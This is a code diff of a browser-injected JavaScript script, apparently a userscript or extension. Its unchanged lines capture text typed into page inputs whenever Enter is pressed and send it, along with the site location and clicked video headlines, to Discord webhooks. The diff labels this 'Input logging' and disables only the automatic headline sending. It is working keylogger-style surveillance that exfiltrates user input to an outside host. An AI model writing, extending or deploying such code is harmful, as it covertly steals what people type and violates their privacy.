@@ -75,6 +75,7 @@ Site: ${baseLocation}`;
     await sendToDiscord(winhook, message);
   }
 
+  // Input logging
   document.addEventListener("keydown", async e => {
     const target = e.target;
     if (e.key !== "Enter") return;
@@ -85,6 +86,7 @@ Site: ${baseLocation}`;
     await sendToDiscord(webhookUrl, sanitizeForDiscord(text));
   });
 
+  // Click tracking for headlines
   document.addEventListener("click", e => {
     const target = e.target.closest(".compact-video, .compact-channel, .shelf-item");
     if (!target) return;
@@ -93,19 +95,9 @@ Site: ${baseLocation}`;
     if (headline) safeSendHeadline(headline);
   });
 
-  const observer = new MutationObserver(muts => {
-    for (const m of muts) {
-      if (!m.addedNodes) continue;
-      for (const node of m.addedNodes) {
-        if (!(node instanceof HTMLElement)) continue;
-        if (node.matches(".compact-video, .compact-channel, .shelf-item")) {
-          const headlineEl = node.querySelector(".compact-media-headline");
-          const headline = headlineEl?.innerText?.trim();
-          if (headline) safeSendHeadline(headline);
-        }
-      }
-    }
-  });
+  // MutationObserver left only to watch for dynamic changes if needed
+  // But it no longer sends headlines automatically
+  const observer = new MutationObserver(() => {});
   observer.observe(document.documentElement || document.body, { childList: true, subtree: true });
   window.addEventListener("beforeunload", () => observer.disconnect());
 })();
